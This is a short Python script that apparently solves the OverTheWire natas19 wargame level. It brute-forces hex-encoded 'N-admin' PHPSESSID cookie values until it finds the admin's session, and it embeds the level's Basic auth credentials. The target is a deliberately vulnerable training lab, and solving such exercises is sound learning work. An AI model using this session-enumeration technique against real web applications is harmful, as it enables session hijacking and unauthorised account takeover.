import requests

# Base URL
url = 'http://natas19.natas.labs.overthewire.org/'

# Function to make a POST request with a specific PHPSESSID
def send_post_with_session_id(session_id):
    # Cookies dictionary
    cookies = {'PHPSESSID': str(session_id)}
    
    headers = {
        'Authorization': 'Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw==',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'close',
        'Cache-Control': 'max-age=0',
        'Origin': 'http://natas19.natas.labs.overthewire.org',
        'Referer': 'http://natas19.natas.labs.overthewire.org/',
        'Upgrade-Insecure-Requests': '1'
    }
    
    # Data payload for the POST request
    data = {'username': 'admin'} 

    # Make the POST request with the specified session ID
    response = requests.post(url, headers=headers, cookies=cookies, data=data)
    
    if not "You are logged in as a regular user" in response.text:
        print("Admin's PHPSESSID is " + str(session_id))
        return True

# Loop through session IDs from 1 to 640
for session_id in range(1, 641):
    session_str = f"{session_id}-admin"
    session_bytes = session_str.encode('utf-8')
    hex_representation = session_bytes.hex()
    if send_post_with_session_id(hex_representation):
        break
